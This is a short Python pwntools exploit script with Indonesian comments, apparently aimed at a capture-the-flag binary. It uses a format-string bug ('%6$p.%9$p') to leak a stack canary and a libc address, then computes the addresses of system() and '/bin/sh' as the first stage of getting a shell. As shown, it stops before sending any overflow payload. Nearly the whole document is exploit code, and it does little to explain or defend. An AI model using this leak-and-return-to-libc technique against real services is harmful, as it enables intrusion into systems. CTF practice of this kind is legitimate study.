from pwn import *

# === KONFIGURASI ===
exe = './vuln'
elf = context.binary = ELF(exe)
# Ganti dengan IP dan Port dari soal CTF
host = 'target-ctf.com' 
port = 1337

def start():
    if args.REMOTE:
        return remote(host, port)
    else:
        return process(exe)

# Jalankan program
p = start()

# === LOKAL/REMOTE LOGIC ===
# Tips: Alamat offset libc di laptopmu dan di server bisa berbeda.
# Jika soal memberikan file libc.so.6, gunakan itu:
# libc = ELF('./libc.so.6')
# puts_offset = libc.symbols['puts']

puts_offset = 0x67360  # Sesuaikan dengan hasil nm/readelf tadi
system_offset = 0x3a920
binsh_offset = 0x15ba0b

# 1. Kirim format string untuk leak canary (param 6) dan libc (param 9)
p.recvuntil(b'Masukkan nama: ')
p.sendline(b'%6$p.%9$p')

# 2. Parse output
# Pakai recvline() sampai dapet output leaknya
leak_data = p.recvline().strip()
parts = leak_data.split(b'.')

try:
    canary = int(parts[0], 16)
    puts_leak = int(parts[1], 16)
    
    # 3. Hitung libc base & target
    libc_base = puts_leak - puts_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset

    success(f"Canary: {hex(canary)}")
    success(f"Libc Base: {hex(libc_base)}")
    success(f"system(): {hex(system_addr)}")
    success(f"/bin/sh: {hex(binsh_addr)}")

except (IndexError, ValueError):
    error("Gagal mendapatkan leak! Cek kembali urutan parameter %p kamu.")

# 4. Interactive mode (agar shell tidak langsung tertutup)
p.interactive()